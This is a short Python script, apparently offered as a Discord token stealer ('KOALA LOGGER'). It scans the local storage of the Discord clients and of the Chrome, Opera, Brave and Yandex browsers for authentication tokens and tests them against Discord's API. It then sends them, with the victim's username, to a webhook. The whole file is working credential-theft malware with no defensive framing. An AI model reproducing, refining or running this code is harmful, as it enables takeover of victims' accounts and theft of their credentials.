import requests
import os
import glob
import re
import getpass
import os

WEBHOOK = ""
appdata = os.getenv('APPDATA')
paths = [
   appdata + '\\Discord',
   appdata + '\\discordcanary',
   appdata + '\\discordptb',
   appdata + '\\Google\\Chrome\\User Data\\Default',
   appdata + '\\Opera Software\\Opera Stable',
   appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
   appdata + '\\Yandex\\YandexBrowser\\User Data\\Default']

pathkns = []
def find(path):
	tokns = []
	file = glob.glob(path + r"\Local Storage\leveldb\*.ldb")
	file.extend(glob.glob(path + r"\Local Storage\leveldb\*.log"))
	for i in file:
		with open( i, 'r',encoding='ISO-8859-1') as filewstuff:
			try:
				possibletoken = filewstuff.read()
				dec = [x.group() for x in re.finditer(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[a-zA-Z0-9_\-]{84}', possibletoken)]
				tokenpath = ['\n\n' + path + ' :\n']
				if len(dec) > 0 and len(dec) < 100:
					pathkns.append(dec)
					tokns.extend(dec)
			except:
				pass
	return tokns

auth = []
def SendTokens(tkns):
	possibletoken = f"@everyone \n> **__[+ KOALA LOGGER +]__** Logged {len(tkns)} tokens from {getpass.getuser()}\n"
	for tkn in tkns:
		possibletoken += tkn + "\n"
	data = {
	"content" : possibletoken,
	"username" : "Token Logger By Infamous Koala"
	}
	requests.post(WEBHOOK, data=data)
for _dir in paths:
	auth.extend(find(_dir))
for check in auth:
	check = str(check)
	if check.startswith('\n'):
		continue
	else:
		r = requests.get('https://canary.discordapp.com/api/v10/users/@me', headers = {'Authorization': check}) #updated to v10
	if r.status_code == 200:
	    auth.append("token pulled:" + check)
SendTokens(auth)
